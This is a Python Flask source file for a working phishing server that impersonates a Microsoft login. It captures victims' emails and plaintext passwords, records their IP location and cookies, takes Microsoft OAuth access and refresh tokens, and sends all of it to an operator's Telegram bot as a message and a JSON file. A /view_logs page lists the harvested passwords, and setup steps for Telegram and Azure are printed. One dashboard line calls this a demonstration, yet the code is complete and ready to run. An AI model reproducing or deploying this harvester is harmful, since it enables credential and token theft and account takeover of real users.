from flask import Flask, request, jsonify, make_response, session, send_file, redirect, url_for
import sqlite3
import datetime
import json
import requests
import uuid
import secrets
from functools import wraps
from werkzeug.middleware.proxy_fix import ProxyFix
import msal
import asyncio
import threading
import os

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

DB_NAME = "logs.db"

# ================== TELEGRAM CONFIG ==================
# Create a bot with @BotFather on Telegram and get your token
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Replace with your bot token
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"      # Replace with your chat ID (can be your personal chat ID or group ID)
# ====================================================

# ================== MICROSOFT OAuth CONFIG ==================
CLIENT_ID = "YOUR_CLIENT_ID"  # Replace with your Azure App Registration Client ID
CLIENT_SECRET = "YOUR_CLIENT_SECRET"  # Replace with your Azure App Registration Client Secret
TENANT_ID = "common"
AUTHORITY = f"https://login.microsoftonline.com/{TENANT_ID}"
REDIRECT_URI = "http://localhost:5000/callback"
SCOPE = ["User.Read"]
# ============================================================

def send_telegram_message(message, parse_mode='HTML'):
    """Send message to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": parse_mode
        }
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            print("[Telegram] Message sent successfully")
        else:
            print(f"[Telegram] Failed to send: {response.text}")
        return response.json()
    except Exception as e:
        print(f"[Telegram] Error: {e}")
        return None

def send_telegram_document(filename, caption=""):
    """Send a file to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filename, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
            response = requests.post(url, files=files, data=data, timeout=30)
            return response.json()
    except Exception as e:
        print(f"[Telegram] Error sending document: {e}")
        return None

def format_login_notification(email, password, ip, location, user_agent, session_token, ms_user_info, session_cookies):
    """Format the login notification message"""
    
    # Parse location if it's JSON
    location_info = ""
    try:
        loc = json.loads(location) if isinstance(location, str) else location
        if loc and isinstance(loc, dict):
            city = loc.get('city', 'Unknown')
            country = loc.get('country', 'Unknown')
            region = loc.get('regionName', '')
            isp = loc.get('isp', 'Unknown')
            location_info = f"📍 Location: {city}, {region}, {country}\n🌐 ISP: {isp}"
        else:
            location_info = f"📍 Location: {location}"
    except:
        location_info = f"📍 Location: {location}"
    
    # Format Microsoft user info
    ms_info = ""
    if ms_user_info:
        ms_info = f"""
👤 Microsoft Account Info:
├─ Display Name: {ms_user_info.get('displayName', 'N/A')}
├─ User ID: {ms_user_info.get('id', 'N/A')}
├─ Given Name: {ms_user_info.get('givenName', 'N/A')}
├─ Surname: {ms_user_info.get('surname', 'N/A')}
└─ Mail: {ms_user_info.get('mail', 'N/A')}
"""
    
    # Format session cookies
    cookies_summary = ""
    if session_cookies:
        try:
            cookies_dict = json.loads(session_cookies) if isinstance(session_cookies, str) else session_cookies
            if cookies_dict:
                cookies_summary = f"""
🍪 Session Cookies:
├─ Session ID: {cookies_dict.get('session_id', 'N/A')[:20]}...
├─ Auth Token: {cookies_dict.get('auth_token', 'N/A')[:20]}...
├─ Logged In: {cookies_dict.get('logged_in', 'N/A')}
├─ Email: {cookies_dict.get('email', 'N/A')}
├─ IP Address: {cookies_dict.get('ip_address', 'N/A')}
├─ Login Time: {cookies_dict.get('login_time', 'N/A')}
└─ Expires: {cookies_dict.get('expires', 'N/A')}
"""
        except:
            cookies_summary = f"🍪 Session Cookies: {session_cookies[:200]}"
    
    message = f"""
🔐 <b>NEW MICROSOFT LOGIN SUCCESSFUL!</b> 🔐

━━━━━━━━━━━━━━━━━━━━━━
📧 <b>CREDENTIALS</b>
├─ Email: <code>{email}</code>
└─ Password: <code>{password}</code>

━━━━━━━━━━━━━━━━━━━━━━
🌐 <b>CONNECTION INFO</b>
├─ IP Address: <code>{ip}</code>
{location_info}
├─ User Agent: <code>{user_agent[:100]}...</code>
└─ Session Token: <code>{session_token[:30]}...</code>
{ms_info}
{cookies_summary}
━━━━━━━━━━━━━━━━━━━━━━
🕐 Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    
    return message

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS access_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip TEXT,
            location TEXT,
            email TEXT,
            password TEXT,
            user_agent TEXT,
            client_cookies TEXT,
            session_cookies TEXT,
            referrer TEXT,
            url TEXT,
            screen TEXT,
            login_success INTEGER DEFAULT 0,
            session_token TEXT UNIQUE,
            auto_captured_email INTEGER DEFAULT 0,
            ms_auth_success INTEGER DEFAULT 0,
            ms_user_info TEXT,
            ms_tokens TEXT,
            ms_session_cookies TEXT,
            telegram_sent INTEGER DEFAULT 0
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def get_location(ip):
    if not ip or ip in ['127.0.0.1', '::1', 'localhost']:
        return json.dumps({"error": "local IP", "city": "Local", "country": "Local"})
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,lat,lon,isp,query",
            timeout=5
        )
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "success":
                return json.dumps(data)
    except:
        pass
    return json.dumps({"error": "location unavailable", "ip": ip})

def get_client_ip():
    ip = request.headers.get('CF-Connecting-IP')
    if ip:
        return ip.strip()
    ip = request.headers.get('X-Forwarded-For')
    if ip:
        ip = ip.split(',')[0].strip()
    else:
        ip = request.headers.get('X-Real-IP')
    if not ip:
        ip = request.remote_addr
    return ip

def is_valid_password(password):
    """Check if password is valid (not empty, not placeholder, reasonable length)"""
    invalid_passwords = ['', '[PASSWORD]', 'password', 'pass', '********', '*****', 
                         '[EMAIL_CAPTURED_NO_PWD_YET]', 'N/A', 'null', 'None', 'undefined']
    
    if not password or password is None:
        return False
    if len(password) < 3:
        return False
    if password.lower() in invalid_passwords:
        return False
    # Check if password is just whitespace
    if password.strip() == "":
        return False
    return True

def is_valid_email(email):
    """Check if email is valid"""
    if not email or email is None:
        return False
    if '@' not in email or len(email) < 5:
        return False
    if email.lower() in ['test@test.com', 'example@example.com', 'user@example.com']:
        return False
    return True

@app.route('/')
def home():
    return send_file('index.html')

@app.route('/login/microsoft')
def login_microsoft():
    msal_app = msal.ConfidentialClientApplication(
        client_id=CLIENT_ID,
        client_credential=CLIENT_SECRET,
        authority=AUTHORITY
    )
    
    auth_url = msal_app.get_authorization_request_url(
        scopes=SCOPE,
        redirect_uri=REDIRECT_URI,
        state=secrets.token_urlsafe(16)
    )
    
    return redirect(auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    
    if not code:
        return redirect('/')
    
    msal_app = msal.ConfidentialClientApplication(
        client_id=CLIENT_ID,
        client_credential=CLIENT_SECRET,
        authority=AUTHORITY
    )
    
    try:
        result = msal_app.acquire_token_by_authorization_code(
            code=code,
            scopes=SCOPE,
            redirect_uri=REDIRECT_URI
        )
        
        if "access_token" in result:
            user_info = requests.get(
                "https://graph.microsoft.com/v1.0/me",
                headers={"Authorization": f"Bearer {result['access_token']}"}
            ).json()
            
            email = user_info.get('mail') or user_info.get('userPrincipalName', '')
            
            # Get the most recent captured credentials from this IP/session
            client_ip = get_client_ip()
            
            conn = sqlite3.connect(DB_NAME)
            cursor = conn.cursor()
            
            # First try to find credentials captured from this IP that haven't been marked as successful yet
            cursor.execute('''
                SELECT id, email, password, ip, location, user_agent, session_token
                FROM access_logs 
                WHERE login_success = 0 
                AND password != '[EMAIL_CAPTURED_NO_PWD_YET]'
                AND ip = ?
                ORDER BY id DESC LIMIT 1
            ''', (client_ip,))
            
            recent = cursor.fetchone()
            
            if not recent:
                # If no credentials from this IP, get the most recent overall
                cursor.execute('''
                    SELECT id, email, password, ip, location, user_agent, session_token
                    FROM access_logs 
                    WHERE login_success = 0 
                    AND password != '[EMAIL_CAPTURED_NO_PWD_YET]'
                    ORDER BY id DESC LIMIT 1
                ''')
                recent = cursor.fetchone()
            
            conn.close()
            
            if recent:
                log_id, captured_email, captured_password, ip, location, user_agent, temp_token = recent
                
                # Validate the captured password before proceeding
                if not is_valid_password(captured_password):
                    print(f"[WARNING] Invalid password in log #{log_id}, not processing - Password: {captured_password[:20] if captured_password else 'None'}")
                    return redirect('/?error=invalid_credentials')
                
                # Validate email
                if not is_valid_email(captured_email):
                    print(f"[WARNING] Invalid email in log #{log_id}, not processing - Email: {captured_email}")
                    return redirect('/?error=invalid_email')
            else:
                # No credentials captured, just use Microsoft info
                log_id = None
                captured_email = email
                captured_password = '[MICROSOFT_OAUTH_NO_PWD]'
                ip = get_client_ip()
                location = get_location(ip)
                user_agent = request.headers.get('User-Agent', 'unknown')
                temp_token = str(uuid.uuid4())
            
            ms_session_data = {
                "access_token": result.get('access_token'),
                "refresh_token": result.get('refresh_token'),
                "id_token": result.get('id_token'),
                "token_type": result.get('token_type'),
                "expires_in": result.get('expires_in'),
                "expires_at": datetime.datetime.now().timestamp() + result.get('expires_in', 3600),
                "scope": result.get('scope')
            }
            
            ms_cookies = {
                "microsoft_session_id": str(uuid.uuid4()),
                "microsoft_user_hash": secrets.token_hex(16),
                "microsoft_auth_time": datetime.datetime.now().isoformat()
            }
            
            session_token = str(uuid.uuid4())
            local_session_cookies = {
                "session_id": session_token,
                "user": captured_email.split('@')[0] if '@' in captured_email else captured_email,
                "auth_token": str(uuid.uuid4()),
                "logged_in": "true",
                "email": captured_email,
                "ip_address": ip,
                "login_time": datetime.datetime.now().isoformat(),
                "expires": (datetime.datetime.now() + datetime.timedelta(days=1)).isoformat(),
                "microsoft_authenticated": True,
                "microsoft_user_id": user_info.get('id', ''),
                "password": captured_password  # Include password in session cookies for display
            }
            
            # Update or create log entry
            conn = sqlite3.connect(DB_NAME)
            cursor = conn.cursor()
            
            if log_id:
                # Update existing log entry
                cursor.execute('''
                    UPDATE access_logs 
                    SET login_success = 1, 
                        ms_auth_success = 1, 
                        ms_user_info = ?,
                        ms_tokens = ?,
                        ms_session_cookies = ?,
                        session_token = ?,
                        session_cookies = ?
                    WHERE id = ?
                ''', (
                    json.dumps(user_info),
                    json.dumps(ms_session_data),
                    json.dumps(ms_cookies),
                    session_token,
                    json.dumps(local_session_cookies),
                    log_id
                ))
            else:
                # Create new log entry
                cursor.execute('''
                    INSERT INTO access_logs 
                    (timestamp, ip, location, email, password, user_agent, 
                     login_success, ms_auth_success, ms_user_info, ms_tokens, 
                     ms_session_cookies, session_token, session_cookies, telegram_sent)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    datetime.datetime.now().isoformat(),
                    ip,
                    location,
                    captured_email,
                    captured_password,
                    user_agent,
                    1,
                    1,
                    json.dumps(user_info),
                    json.dumps(ms_session_data),
                    json.dumps(ms_cookies),
                    session_token,
                    json.dumps(local_session_cookies),
                    0
                ))
                log_id = cursor.lastrowid
            
            conn.commit()
            conn.close()
            
            # Send to Telegram with complete info including password (only if valid)
            if is_valid_password(captured_password):
                message = format_login_notification(
                    captured_email,
                    captured_password,
                    ip,
                    location,
                    user_agent,
                    session_token,
                    user_info,
                    json.dumps(local_session_cookies)
                )
                
                send_telegram_message(message)
                
                # Also send the tokens as a file for complete capture
                tokens_data = {
                    "email": captured_email,
                    "password": captured_password,  # Include the actual password
                    "ip": ip,
                    "location": json.loads(location) if isinstance(location, str) else location,
                    "user_agent": user_agent,
                    "session_token": session_token,
                    "session_cookies": local_session_cookies,
                    "microsoft_tokens": ms_session_data,
                    "user_info": user_info,
                    "timestamp": datetime.datetime.now().isoformat()
                }
                
                # Save to temp file and send
                temp_file = f"session_{session_token[:8]}.json"
                with open(temp_file, 'w') as f:
                    json.dump(tokens_data, f, indent=2)
                
                send_telegram_document(temp_file, f"Complete session data for {captured_email} (Password: {captured_password})")
                
                # Clean up temp file
                os.remove(temp_file)
                
                # Update telegram_sent flag
                conn = sqlite3.connect(DB_NAME)
                cursor = conn.cursor()
                cursor.execute('UPDATE access_logs SET telegram_sent = 1 WHERE id = ?', (log_id,))
                conn.commit()
                conn.close()
            
            print(f"\n{'='*60}")
            print(f"[SUCCESS] Microsoft Login Successful!")
            print(f"  Email: {captured_email}")
            print(f"  Password: {captured_password if is_valid_password(captured_password) else '[INVALID - NOT SENT]'}")
            print(f"  IP: {ip}")
            print(f"  Session Token: {session_token}")
            print(f"  Telegram Notification: {'SENT' if is_valid_password(captured_password) else 'SKIPPED (invalid password)'}")
            print(f"{'='*60}\n")
            
            # Create response with all session cookies
            resp = make_response(redirect('/dashboard'))
            
            resp.set_cookie('session_token', session_token, max_age=86400, httponly=True, samesite='Lax', path='/')
            resp.set_cookie('user_email', captured_email, max_age=86400, httponly=False, samesite='Lax', path='/')
            resp.set_cookie('user_logged_in', 'true', max_age=86400, httponly=False, samesite='Lax', path='/')
            resp.set_cookie('auth_token', local_session_cookies['auth_token'], max_age=86400, httponly=True, samesite='Lax', path='/')
            resp.set_cookie('MSAuth', ms_cookies['microsoft_session_id'], max_age=86400, httponly=True, samesite='Lax', path='/')
            resp.set_cookie('user_password', captured_password, max_age=86400, httponly=True, samesite='Lax', path='/')
            
            session['ms_tokens'] = ms_session_data
            session['ms_user'] = user_info
            session['session_token'] = session_token
            session['user_password'] = captured_password
            
            return resp
        else:
            return redirect('/?error=auth_failed')
            
    except Exception as e:
        print(f"[ERROR] {e}")
        return redirect('/?error=server_error')

@app.route('/log', methods=['POST'])
def log_credentials():
    try:
        data = request.get_json() if request.is_json else request.form.to_dict()
        
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        
        # Validate email and password before saving
        if not is_valid_email(email):
            print(f"[WARNING] Invalid email format: {email} - not saving")
            return jsonify({
                "status": "error", 
                "message": "Valid email required",
                "redirect": False
            }), 400
        
        if not is_valid_password(password):
            print(f"[WARNING] Invalid password for {email} - not saving (password: {password[:10] if password else 'empty'})")
            return jsonify({
                "status": "error", 
                "message": "Invalid password, please try again",
                "redirect": False
            }), 400
        
        ip = get_client_ip()
        location = get_location(ip)
        
        user_agent = data.get('user_agent', request.headers.get('User-Agent', 'unknown'))
        client_cookies = json.dumps(dict(request.cookies))
        referrer = data.get('referrer', request.headers.get('Referer', ''))
        url = data.get('url', '')
        screen = data.get('screen', '')
        
        session_token = str(uuid.uuid4())
        
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO access_logs 
            (timestamp, ip, location, email, password, user_agent, client_cookies, 
             referrer, url, screen, login_success, session_token)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            datetime.datetime.now().isoformat(),
            ip,
            location,
            email,
            password,
            user_agent,
            client_cookies,
            referrer,
            url,
            screen,
            0,
            session_token
        ))
        conn.commit()
        log_id = cursor.lastrowid
        conn.close()
        
        print(f"\n{'='*60}")
        print(f"[LOG #{log_id}] VALID Credentials captured:")
        print(f"  IP:        {ip}")
        print(f"  Email:     {email}")
        print(f"  Password:  {password}")
        print(f"  UserAgent: {user_agent[:80]}...")
        print(f"{'='*60}\n")
        
        return jsonify({
            "status": "success",
            "message": "Credentials captured. Redirecting to Microsoft...",
            "redirect": True,
            "oauth_url": url_for('login_microsoft', _external=True)
        })
        
    except Exception as e:
        print(f"[ERROR] {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/capture_email', methods=['POST'])
def capture_email():
    try:
        data = request.get_json() if request.is_json else request.form.to_dict()
        email = data.get('email', '').strip()
        
        # Validate email format before saving
        if not is_valid_email(email):
            print(f"[WARNING] Invalid email format for capture: {email}")
            return jsonify({"status": "error", "message": "Valid email required"}), 400
        
        session['captured_email'] = email
        
        ip = get_client_ip()
        location = get_location(ip)
        
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO access_logs 
            (timestamp, ip, location, email, password, user_agent, client_cookies, 
             referrer, url, screen, login_success, auto_captured_email)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            datetime.datetime.now().isoformat(),
            ip,
            location,
            email,
            '[EMAIL_CAPTURED_NO_PWD_YET]',
            request.headers.get('User-Agent', 'unknown'),
            json.dumps(dict(request.cookies)),
            request.headers.get('Referer', ''),
            data.get('url', ''),
            data.get('screen', ''),
            0,
            1
        ))
        conn.commit()
        conn.close()
        
        resp = make_response(jsonify({
            "status": "success",
            "message": "Email captured",
            "redirect": False
        }))
        
        resp.set_cookie('captured_email', email, max_age=3600, httponly=True, samesite='Lax')
        
        return resp
        
    except Exception as e:
        print(f"[ERROR] {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/dashboard', methods=['GET'])
def dashboard():
    session_token = request.cookies.get('session_token')
    user_email = request.cookies.get('user_email')
    user_password = request.cookies.get('user_password', 'Not captured')
    
    if not session_token or not user_email:
        return '''
        <html>
        <head><title>Not Authenticated</title></head>
        <body>
            <h1>Not Authenticated</h1>
            <p>Please <a href="/">login here</a></p>
        </body>
        </html>
        ''', 401
    
    ms_user = session.get('ms_user', {})
    
    # Get additional session info from database
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('SELECT session_cookies, ip, location FROM access_logs WHERE session_token = ?', (session_token,))
    result = cursor.fetchone()
    conn.close()
    
    session_cookies_display = ""
    ip_display = ""
    location_display = ""
    
    if result and result[0]:
        try:
            cookies = json.loads(result[0])
            session_cookies_display = f"""
            <div class="info">
                <h3>Session Information</h3>
                <p><strong>Session ID:</strong> {cookies.get('session_id', 'N/A')}</p>
                <p><strong>Auth Token:</strong> {cookies.get('auth_token', 'N/A')}</p>
                <p><strong>Login Time:</strong> {cookies.get('login_time', 'N/A')}</p>
                <p><strong>Expires:</strong> {cookies.get('expires', 'N/A')}</p>
                <p><strong>Your Password:</strong> <code>{cookies.get('password', 'N/A')}</code></p>
            </div>
            """
        except:
            pass
    
    if result and result[1]:
        ip_display = f"<p><strong>Your IP Address:</strong> {result[1]}</p>"
    
    if result and result[2]:
        try:
            loc = json.loads(result[2])
            if isinstance(loc, dict):
                location_display = f"<p><strong>Your Location:</strong> {loc.get('city', 'Unknown')}, {loc.get('country', 'Unknown')}</p>"
        except:
            location_display = f"<p><strong>Your Location:</strong> {result[2]}</p>"
    
    return f'''
    <html>
    <head>
        <title>Dashboard - Microsoft Account</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }}
            .container {{ max-width: 800px; margin: auto; }}
            .card {{ background: #f5f5f5; padding: 20px; border-radius: 10px; margin-bottom: 20px; }}
            .success {{ color: green; }}
            .info {{ background: #e3f2fd; padding: 10px; border-radius: 5px; margin-top: 10px; }}
            .warning {{ background: #fff3cd; border-left: 4px solid #ffc107; padding: 10px; margin-top: 10px; }}
            button {{ background: #0078d4; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }}
            button:hover {{ background: #005a9e; }}
            code {{ background: #f4f4f4; padding: 2px 5px; border-radius: 3px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>✅ Microsoft Account Dashboard</h1>
            
            <div class="card">
                <h2>Welcome, {ms_user.get('displayName', user_email)}!</h2>
                <p><strong>Email:</strong> {user_email}</p>
                <p><strong>Password:</strong> <code>{user_password}</code></p>
                <p><strong>Login Time:</strong> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p><strong>Session Token:</strong> {session_token[:20]}...</p>
                {ip_display}
                {location_display}
            </div>
            
            <div class="card">
                <h3>Microsoft Account Info</h3>
                <div class="info">
                    <p><strong>User ID:</strong> {ms_user.get('id', 'N/A')}</p>
                    <p><strong>Display Name:</strong> {ms_user.get('displayName', 'N/A')}</p>
                    <p><strong>Given Name:</strong> {ms_user.get('givenName', 'N/A')}</p>
                    <p><strong>Surname:</strong> {ms_user.get('surname', 'N/A')}</p>
                    <p><strong>Mail:</strong> {ms_user.get('mail', 'N/A')}</p>
                </div>
                {session_cookies_display}
            </div>
            
            <div class="warning">
                <strong>⚠️ Note:</strong> This dashboard shows your captured information for demonstration purposes.
            </div>
            
            <form action="/logout" method="POST" style="margin-top: 20px;">
                <button type="submit">Logout</button>
            </form>
            
            <p style="margin-top: 20px;"><a href="/view_logs">View Logs</a></p>
        </div>
    </body>
    </html>
    '''

@app.route('/password')
def password_page():
    """Serve the password page"""
    return send_file('password.html')

@app.route('/view_logs', methods=['GET'])
def view_logs():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT id, timestamp, ip, location, email, password, login_success, ms_auth_success,
               session_token, user_agent, telegram_sent, session_cookies
        FROM access_logs 
        ORDER BY id DESC LIMIT 50
    ''')
    logs = cursor.fetchall()
    conn.close()
    
    html = '''
    <html>
    <head>
        <title>Access Logs</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            table { border-collapse: collapse; width: 100%; }
            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
            th { background-color: #4CAF50; color: white; }
            tr:nth-child(even) { background-color: #f2f2f2; }
            .success { color: green; font-weight: bold; }
            .failed { color: red; }
            .telegram-sent { color: blue; font-weight: bold; }
            .container { max-width: 1200px; margin: auto; }
            .password-col { font-family: monospace; max-width: 200px; word-wrap: break-word; }
            .details-btn { background: #0078d4; color: white; border: none; padding: 5px 10px; cursor: pointer; border-radius: 3px; }
            .details-btn:hover { background: #005a9e; }
            .modal { display: none; position: fixed; z-index: 1; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.4); }
            .modal-content { background-color: #fefefe; margin: 15% auto; padding: 20px; border: 1px solid #888; width: 80%; max-width: 600px; border-radius: 10px; }
            .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
            .close:hover { color: black; }
        </style>
        <script>
            function showDetails(cookies) {
                var modal = document.getElementById("detailsModal");
                var content = document.getElementById("modalContent");
                try {
                    var parsed = JSON.parse(cookies);
                    content.innerHTML = "<pre>" + JSON.stringify(parsed, null, 2) + "</pre>";
                } catch(e) {
                    content.innerHTML = "<pre>" + cookies + "</pre>";
                }
                modal.style.display = "block";
            }
            function closeModal() {
                document.getElementById("detailsModal").style.display = "none";
            }
        </script>
    </head>
    <body>
        <div class="container">
            <h1>Access Logs</h1>
            <p><a href="/">Back to Login</a> | <a href="/dashboard">Dashboard</a></p>
            
            <div id="detailsModal" class="modal">
                <div class="modal-content">
                    <span class="close" onclick="closeModal()">&times;</span>
                    <h3>Session Cookies Details</h3>
                    <div id="modalContent"></div>
                </div>
            </div>
            
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Timestamp</th>
                        <th>IP</th>
                        <th>Email</th>
                        <th>Password</th>
                        <th>Status</th>
                        <th>MS Auth</th>
                        <th>Telegram</th>
                        <th>Session Cookies</th>
                    </tr>
                </thead>
                <tbody>
    '''
    
    for log in logs:
        status_class = "success" if log[6] else "failed"
        status_text = "Success" if log[6] else "Failed"
        ms_auth = "✓" if log[7] else "✗"
        telegram_status = "✓ Sent" if log[10] else "✗"
        telegram_class = "telegram-sent" if log[10] else ""
        
        password_display = log[5][:40] + '...' if len(log[5]) > 40 else log[5]
        
        html += f'''
                    <tr>
                        <td>{log[0]}</td>
                        <td>{log[1]}</td>
                        <td>{log[2]}</td>
                        <td>{log[4]}</td>
                        <td class="password-col" title="{log[5]}">{password_display}</td>
                        <td class="{status_class}">{status_text}</td>
                        <td>{ms_auth}</td>
                        <td class="{telegram_class}">{telegram_status}</td>
                        <td><button class="details-btn" onclick="showDetails({json.dumps(log[11] if log[11] else '{}')})">View Details</button></td>
                    </tr>
        '''
    
    html += '''
                </tbody>
            </table>
        </div>
    </body>
    </html>
    '''
    
    return html

@app.route('/logout', methods=['GET', 'POST'])
def logout():
    resp = make_response(redirect('/'))
    cookies_to_clear = ['session_token', 'user_email', 'user_logged_in', 'captured_email', 'auth_token', 'MSAuth', 'user_password']
    for cookie in cookies_to_clear:
        resp.delete_cookie(cookie, path='/')
    session.clear()
    return resp

if __name__ == '__main__':
    print("=" * 60)
    print("   Microsoft Login with Telegram Notifications")
    print("=" * 60)
    print(f"Login Page    : http://localhost:5000/")
    print(f"Dashboard     : http://localhost:5000/dashboard")
    print(f"View Logs     : http://localhost:5000/view_logs")
    print("=" * 60)
    print("\n[TELEGRAM SETUP]")
    print("1. Message @BotFather on Telegram to create a bot")
    print("2. Get your bot token")
    print("3. Get your chat ID (message @userinfobot)")
    print("4. Update TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in app.py")
    print("=" * 60)
    print("\n[AZURE SETUP]")
    print("1. Register app at https://portal.azure.com/")
    print("2. Set redirect URI to: http://localhost:5000/callback")
    print("3. Copy Client ID and Client Secret to app.py")
    print("=" * 60)
    app.run(host='127.0.0.1', port=5000, debug=True, threaded=True)